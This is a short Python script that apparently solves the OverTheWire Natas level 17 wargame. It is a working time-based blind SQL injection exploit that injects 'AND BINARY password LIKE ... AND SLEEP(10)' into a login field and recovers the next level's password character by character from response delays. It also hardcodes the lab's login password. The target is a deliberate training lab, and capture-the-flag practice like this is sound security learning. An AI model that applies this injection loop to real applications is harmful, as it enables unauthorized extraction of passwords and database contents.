import requests
import re
import string

username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

url = f"http://{username}.natas.labs.overthewire.org/"

#response = requests.post(url, auth = (username, password), data = {"username" : 'natas18" AND BINARY password LIKE "' + nataspass + char + '%" AND SLEEP(10) #'})

#print(response.text)

letters = string.ascii_letters + string.digits
nataspass = ''

while len(nataspass) < 32:
	for char in letters:
		print(f"Attempting password: {nataspass}{char}")
		response = requests.post(url, auth = (username, password), data = {"username" : 'natas18" AND BINARY password LIKE "' + nataspass + char + '%" AND SLEEP(10) #'})
		#print(response.elapsed.total_seconds())
		if response.elapsed.total_seconds() > 10:
			nataspass += char
			print(nataspass)
			break